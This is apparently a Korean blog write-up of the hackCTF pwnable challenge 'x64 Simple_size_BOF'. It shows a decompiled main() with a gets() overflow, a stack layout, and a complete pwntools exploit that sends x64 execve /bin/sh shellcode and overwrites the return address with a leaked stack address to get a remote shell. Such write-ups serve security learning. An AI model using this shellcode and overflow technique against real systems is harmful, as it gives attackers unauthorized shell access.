---
layout: post
title:  "[hackCTF]x64 Simple_size_BOF"
date:   2020-02-11
---

hackCTF pwnable 여섯번째 문제

![favicon](https://drive.google.com/uc?id=1EPkDaLZatWWYaPyJ3wVlOrAu-eubvG9c)

## ida - main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-6D30h]

  setvbuf(bss_start, 0LL, 2, 0LL);
  puts(&s); // s에 저장된 문자열을 출력한다
  printf("buf: %p\n", &v4); // v4의 주소를 출력한다
  gets(&v4); // stdin으로부터 문자열을 입력 받아 v4에 저장한다
  return 0;
}
```
<br>

정리해보자.<br><br>

***

| ret |            |
|:---:|:----------:|
| sfp |   (8byte)  |
| rbp |            |
| ... |            |
|  v4 | rbp-0x6D30 |

***
<br>

![0602](https://drive.google.com/uc?id=1IKf6P8UjdQnO0iOExB2Syd8_4ONi70Ve)  
NX 보호기법이 미적용되었으므로 stack에서 쉘코드를 실행시킬 수 있다.  gets로 v4에 쉘코드를 저장하고 ret을 v4의 시작주소로 덮어 문제를 해결하자.<br><br><br>
![0601](https://drive.google.com/uc?id=1OvYOaP63MM0QloMKUdMvTyWAvb09Ncue)  
이 때 ASLR 보호기법이 적용되어 파일을 실행할 때마다 주소가 변하므로 처음 v4의 주소를 출력하면 그 주소를 받아 payload를 완성해야 한다.<br><br>
목표 : 계속 변하는 v4의 주소로 ret을 덮는 payload 완성하기<br>
취약점 : gets(&v4)<br><br><br>

## exploit.py
```python
#!/usr/bin/python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3005)

p.recvuntil("buf: ") # "buf: "까지 받는다

buf = int(p.recv(14), 16) # 14바이트를 받고 16진수로 변환하여 buf에 저장

payload = "\x90"*0x9 # nop으로 일부 채우기

payload += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05" # 쉘코드

payload += "\x90"*(0x6D30 - 0x20 + 0x8) # sfp까지 nop으로 채우기

payload += p64(buf) # 앞에서 받은 v4의 주소(buf) 추가

p.sendline(payload)

p.interactive()
```

## 결과
![0603](https://drive.google.com/uc?id=1YE2LhE9ENLXGPJCWHLNMffHGCiNN3kcr)
